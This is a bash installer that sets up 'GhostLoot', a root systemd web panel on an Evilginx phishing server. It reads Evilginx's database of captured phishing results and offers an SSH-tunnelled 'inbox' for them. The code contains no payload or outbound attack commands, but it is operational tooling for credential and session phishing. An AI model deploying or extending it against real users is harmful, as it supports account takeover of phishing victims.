#!/usr/bin/env bash
# Install GhostLoot on the Evilginx server.
# Usage: sudo ./install.sh
set -euo pipefail

if [[ ${EUID:-} -ne 0 ]]; then
  echo "run as root: sudo $0" >&2
  exit 1
fi

DEST=/opt/ghostloot
CONF=/etc/ghostloot.conf

src=""
for c in ghostloot evilginx-dashboard; do
  if [[ -f $c ]]; then src=$c; break; fi
done
if [[ -z $src ]]; then
  echo "No panel binary in this directory. Build it first:" >&2
  echo "  make build-linux" >&2
  echo "  (produces ./evilginx-dashboard)" >&2
  exit 1
fi

find_db() {
  local c
  for c in /root/.evilginx/data.db "${SUDO_USER:+/home/$SUDO_USER/.evilginx/data.db}" /opt/evilginx2/data.db; do
    [[ -n $c && -f $c ]] || continue
    echo "$c"
    return
  done
  echo /root/.evilginx/data.db
}

find_evilginx() {
  local c
  for c in /opt/evilginx2/evilginx2 /usr/local/bin/evilginx2 /usr/bin/evilginx2 /opt/evilginx/evilginx2; do
    if [[ -x $c ]]; then echo "$c"; return; fi
  done
  command -v evilginx2 2>/dev/null || command -v evilginx 2>/dev/null || true
}

evilginx_cmd_for() {
  local bin="$1" dir
  dir=$(dirname "$bin")
  if [[ -d $dir/phishlets ]]; then
    printf 'cd %q && sudo ./%q -p ./phishlets' "$dir" "$(basename "$bin")"
  else
    printf 'sudo %q' "$bin"
  fi
}

port_busy() {
  local p="$1"
  if command -v ss >/dev/null 2>&1; then
    ss -lptn 2>/dev/null | grep -qE ":${p}([^0-9]|$)"
  elif command -v lsof >/dev/null 2>&1; then
    lsof -nP -iTCP:"$p" -sTCP:LISTEN >/dev/null 2>&1
  else
    return 1
  fi
}

pick_port() {
  if [[ -f $CONF ]]; then
    local old
    old=$(awk -F= '/^addr=/{print $2}' "$CONF" | tr -d "\"'" | awk -F: '{print $NF}')
    if [[ -n $old ]] && { ! port_busy "$old" || systemctl is-active --quiet ghostloot 2>/dev/null; }; then
      echo "$old"
      return
    fi
  fi
  local p
  for p in 8090 8091 8092 8093 8094; do
    if ! port_busy "$p"; then echo "$p"; return; fi
    if systemctl is-active --quiet ghostloot 2>/dev/null; then echo "$p"; return; fi
  done
  echo "no free port in 8090-8094 on this host" >&2
  exit 1
}

db=$(find_db)
bin=$(find_evilginx)
port=$(pick_port)
addr="127.0.0.1:${port}"
evil_cmd=""
if [[ -n $bin ]]; then
  evil_cmd=$(evilginx_cmd_for "$bin")
fi

mkdir -p "$DEST"
cp "$src" "$DEST/ghostloot"
chmod 755 "$DEST/ghostloot"

install -m 0755 ghostloot.sh /usr/local/bin/ghostloot
ln -sfn /usr/local/bin/ghostloot /usr/local/bin/ghostloot-host

{
  printf 'db=%q\n' "$db"
  printf 'addr=%q\n' "$addr"
  printf 'panel_bin=%q\n' "$DEST/ghostloot"
  printf 'tmux_session=%q\n' "evilginx"
  if [[ -n $evil_cmd ]]; then
    printf 'evilginx_cmd=%q\n' "$evil_cmd"
  else
    echo "# evilginx_cmd=   # not found — panel still works; set this to auto-start Evilginx"
  fi
} >"$CONF"
chmod 644 "$CONF"

cat >/etc/systemd/system/ghostloot.service <<EOF
[Unit]
Description=GhostLoot panel ($addr)
After=network.target

[Service]
Type=simple
ExecStart=$DEST/ghostloot -addr $addr -db $db
Restart=on-failure
RestartSec=2
User=root
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable ghostloot
systemctl restart ghostloot

echo
echo "GhostLoot panel  http://$addr  (loopback only)"
echo "config           $CONF"
if [[ -n $evil_cmd ]]; then
  echo "evilginx         $evil_cmd"
else
  echo "evilginx         not found — start it yourself, or set evilginx_cmd in $CONF"
fi
echo
echo "From your laptop:"
echo "  ./install-local.sh"
echo "  ghostloot init user@$(hostname -f 2>/dev/null || hostname) /path/to/ssh-key ${port}"
echo "  ghostloot            # open the inbox"
echo "  ghostloot down       # stop panel + tunnel (Evilginx stays up)"
echo "  ghostloot help       # cheatsheet"
echo
echo "logs     journalctl -u ghostloot -f"
echo "stop     systemctl stop ghostloot   # or: ghostloot down  (from the laptop)"
echo "update   copy a new binary to $DEST/ghostloot && systemctl restart ghostloot"
